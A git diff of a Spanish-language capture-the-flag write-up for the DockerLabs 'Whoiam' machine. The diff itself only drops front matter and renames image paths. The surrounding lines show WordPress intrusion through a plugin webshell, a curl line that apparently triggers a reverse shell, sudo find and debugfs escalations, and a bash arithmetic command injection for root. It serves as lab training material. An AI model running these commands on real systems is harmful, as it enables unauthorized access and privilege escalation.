@@ -1,16 +1,3 @@
----
-título: DockerLabs - Whoiam
-fecha: 2026-09-30
-plataforma: DockerLabs
-dificultad: Fácil
-sistema: Linux
-ip: 172.18.0.2
-estado: completado
-etiquetas:
-  - ctf
-  - writeup
-  - dockerlabs
----
 # DockerLabs - Whoiam
 
 **Resumen:** La máquina expone un servidor web WordPress. Mediante fuzzing de directorios se localiza un backup con credenciales válidas del usuario `developer`. Tras acceder al panel de administración, se aprovecha la funcionalidad de subida de plugins para desplegar un plugin malicioso que otorga ejecución remota de comandos. La escalada de privilegios se realiza en tres etapas: primero a `rafa` mediante `sudo find`, luego a `ruben` con `debugfs`, y finalmente a `root` explotando una inyección de comandos en el script `/opt/penguin.sh`.
@@ -32,11 +19,11 @@ etiquetas:
 
 Se verificó la conectividad con el objetivo y, acto seguido, se ejecutó `nmap` para identificar los puertos abiertos.
 
-![Escaneo inicial](Assets/Pasted%20image%2020260928200059.png)
+![Escaneo inicial](assets/Pasted%20image%2020260928200059.png)
 
 Se identificó el puerto 80, por lo que se procedió a inspeccionar el servicio web.
 
-![Servicio web](Assets/Pasted%20image%2020260928200124.png)
+![Servicio web](assets/Pasted%20image%2020260928200124.png)
 
 ### Fuzzing de directorios
 
@@ -48,7 +35,7 @@ gobuster dir -u http://172.18.0.2 -w /usr/share/wordlists/dirb/common.txt -x php
 
 **Resultado:**
 
-![Fuzzing de directorios](Assets/Pasted%20image%2020260928200319.png)
+![Fuzzing de directorios](assets/Pasted%20image%2020260928200319.png)
 
 Se accedió a `/license.txt`, que únicamente contenía el texto por defecto generado por WordPress al ser levantado.
 
@@ -56,19 +43,19 @@ Se accedió a `/license.txt`, que únicamente contenía el texto por defecto gen
 
 Al ingresar a `/wp-admin` se visualizó el panel de inicio de sesión de WordPress. Se intentó el acceso con credenciales por defecto pero no hubo resultado.
 
-![Login de WordPress](Assets/Pasted%20image%2020260928200554.png)
+![Login de WordPress](assets/Pasted%20image%2020260928200554.png)
 
 En `/includes` se observó lo siguiente:
 
-![Directorio includes](Assets/Pasted%20image%2020260928201519.png)
+![Directorio includes](assets/Pasted%20image%2020260928201519.png)
 
 Posteriormente, se exploró el directorio `Backups` y se halló:
 
-![Directorio Backups](Assets/Pasted%20image%2020260929200843.png)
+![Directorio Backups](assets/Pasted%20image%2020260929200843.png)
 
 Al descomprimir el archivo `.zip`, se obtuvo:
 
-![Contenido del zip](Assets/Pasted%20image%2020260928211317.png)
+![Contenido del zip](assets/Pasted%20image%2020260928211317.png)
 
 | Usuario | Contraseña |
 | :--- | :--- |
@@ -80,7 +67,7 @@ Al descomprimir el archivo `.zip`, se obtuvo:
 
 Se probaron las credenciales obtenidas y se logró el acceso:
 
-![Acceso al panel](Assets/Pasted%20image%2020260928212102.png)
+![Acceso al panel](assets/Pasted%20image%2020260928212102.png)
 
 Para mayor comodidad, se creó un usuario con permisos de administrador.
 
@@ -91,13 +78,13 @@ Para mayor comodidad, se creó un usuario con permisos de administrador.
 - **Tipo:** Subida de archivos arbitrarios (plugin malicioso en WordPress)
 - **Endpoint / Servicio:** Panel de administración de WordPress (`/wp-admin`)
 
-![Subida de plugin](Assets/Pasted%20image%2020261003144111.png)
+![Subida de plugin](assets/Pasted%20image%2020261003144111.png)
 
 Se identificó la posibilidad de subir plugins en formato `.zip`. Aprovechando esta funcionalidad, se creó un archivo PHP malicioso dentro de una carpeta llamada `mi-plugin`, se comprimió con `zip -r mi-plugin.zip mi-plugin` y se subió como plugin. Una vez instalado, se accedió a la siguiente URL para ejecutar comandos:
 
 `http://172.18.0.2/wp-content/plugins/mi-plugin/shell.php?cmd=sudo%20-l`
 
-![Ejecución de comandos](Assets/Pasted%20image%2020260928222134.png)
+![Ejecución de comandos](assets/Pasted%20image%2020260928222134.png)
 
 **Contenido del `.php` que va dentro del `mi-plugin`:**
 
@@ -175,7 +162,7 @@ curl -v --get --data-urlencode "ip=172.18.0.2" --data-urlencode "port=4444" "htt
 
 Se ejecutó `sudo -l` y se obtuvo:
 
-![sudo -l www-data](Assets/Pasted%20image%2020260928224521.png)
+![sudo -l www-data](assets/Pasted%20image%2020260928224521.png)
 
 ---
 
@@ -191,11 +178,11 @@ sudo -u rafa find . -exec /bin/sh \; -quit
 
 Resultado:
 
-![Escalada a rafa](Assets/Pasted%20image%2020260930184324.png)
+![Escalada a rafa](assets/Pasted%20image%2020260930184324.png)
 
 Una vez dentro, se enumeraron los permisos de `rafa` y se buscaron otros usuarios para continuar la escalada.
 
-![Enumeración rafa](Assets/Pasted%20image%2020260930184529.png)
+![Enumeración rafa](assets/Pasted%20image%2020260930184529.png)
 
 ### Escalada a ruben
 
@@ -205,17 +192,17 @@ Se utilizó `debugfs` con permisos de `sudo` para escalar a `ruben`:
 sudo -u ruben debugfs
 ```
 
-![Escalada a ruben](Assets/Pasted%20image%2020260930184548.png)
+![Escalada a ruben](assets/Pasted%20image%2020260930184548.png)
 
 Dentro de la sesión, se verificó con `sudo -l` que `ruben` podía ejecutar un script `.sh` con `/bin/bash` ubicado en `/opt`.
 
-![Permisos ruben](Assets/Pasted%20image%2020260930184745.png)
+![Permisos ruben](assets/Pasted%20image%2020260930184745.png)
 
 ### Escalada a root
 
 Se accedió al directorio y se inspeccionó el contenido del script con `cat`. El script validaba que la variable `$num` fuera igual a `42`. Tras varias pruebas, se observó que aceptaba expresiones como `a+42` y devolvía "Correct". Aprovechando esta validación, se buscó un comando que, al ser evaluado, permitiera obtener una shell de bash.
 
-![Script penguin.sh](Assets/Pasted%20image%2020260928230538.png)
+![Script penguin.sh](assets/Pasted%20image%2020260928230538.png)
 
 Finalmente, se ejecutó el script como root:
 
@@ -231,7 +218,7 @@ a[$(/bin/bash>&2)]+42
 
 Como resultado, se obtuvo una shell como `root`, finalizando la máquina.
 
-![Root obtenido](Assets/Pasted%20image%2020260928235535.png)
+![Root obtenido](assets/Pasted%20image%2020260928235535.png)
 
 ---
 
